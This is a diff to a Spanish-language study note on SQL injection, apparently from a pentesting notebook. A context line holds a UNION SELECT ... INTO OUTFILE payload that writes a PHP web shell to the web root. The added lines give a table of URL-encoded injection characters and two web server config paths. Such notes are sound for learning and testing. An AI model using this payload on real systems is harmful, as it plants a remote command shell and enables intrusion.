@@ -161,12 +161,16 @@ cn' union select "",'<?=`$_GET[0]`?>', "", "" into outfile '/var/www/html/shell.
 ## Overview
 
 
-***
-
-## Notas Relacionadas
-
 
 ***
 
 /etc/nginx//sites-enabled/default
  /etc/apache2/sites-enabled/000-default.conf
+ 
+|**Payload (Carácter Especial)**|**Valor URL Encoded**|**Función Estructural en Inyecciones**|
+|---|---|---|
+|`'` (Comilla simple)|`%27`|Ruptura de cadenas de texto y escape de contexto principal.|
+|`"` (Comilla doble)|`%22`|Ruptura de identificadores o strings alternativos (depende del SGBD).|
+|`#` (Almohadilla)|`%23`|Operador de comentario en [[MySQL]]; trunca el resto de la consulta original.|
+|`;` (Punto y coma)|`%3B`|Terminador de sentencias; crucial para habilitar inyecciones apiladas (Stacked Queries).|
+|`)` (Paréntesis de cierre)|`%29`|Equilibrio de sintaxis; permite cerrar funciones o subconsultas previas al payload.|
